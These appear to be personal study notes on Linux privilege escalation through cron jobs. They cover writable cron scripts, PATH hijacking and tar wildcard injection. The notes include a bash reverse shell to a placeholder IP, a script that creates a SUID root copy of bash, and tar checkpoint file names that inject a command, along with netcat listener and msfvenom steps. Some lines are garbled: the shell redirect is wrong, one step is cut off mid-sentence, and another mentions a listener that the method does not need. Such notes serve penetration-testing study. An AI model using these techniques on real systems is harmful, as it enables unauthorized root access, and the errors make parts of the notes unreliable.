Cronjobs


1) File Permissions

If we can write to a program or script which gets run as part of a 
cron job, we can replace it with our own code.

step 1: check the crontabs   -->  cat /etc/crontab

step 2: Check for the file permissions of cronjob file. 

step 3: If it is writable overwrite that file with a reverse shell. 

	bash -i >& /dev/tcp/<IP>/port 0&>1

step 4: Set a netcat lisiner on the same port. when the cronjob runs we will get a root shell.


_________________________________________________________________________________________________________________________

2) Path Environment Variable

If a cron job program/script does not use an absolute path, and one
of the PATH directories is writable by our user, we may be able to
create a program/script with the same name as the cron job.


The crontabs has a path that is alreay set or externally set.
The system will search for that path firstly and goes to another after.
If the path that is set previously that can be user controllable and the 
running crontab doesnt specify the absolute path of the running file then 
we can create a our own file with the same name of the file. Then the 
system will run our file instead of the original file.

step 1: check the crontabs   -->  cat /etc/crontab

step 2: Check for the path and identify wheather the path is user writable or not.

step 3: If it is user writable create a file with same file name in that user writable path. 

	(SUID version of Bash to exploit)

step 4: Set a netcat lisiner on the same port. when the cronjob runs we will get a root shell.

SUID version of Bash to exploit
_______________________________

Code 
``
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
``

give execute permisiions to the file

_________________________________________________________________________________________________________________________

3) Wild card Character (*)


The cronjob uses a particular command with a wildcard (*) as root. we can use this to elevate 
pervlages by checking GTFOBin.

Step 1: Check for Cronjobs

Step 2: identify a cronjob that is being running with a wildcard character (*). 

Step 3: check for GTFOBin. and create a reverse shell with msfvenom upload to 

Step 4: execute that command accordingly.  (./--checkpoint=1) (./--checkpoint-action=exec=<reverse_shell_file)

step 5: setup a setcat lisner in local machine.











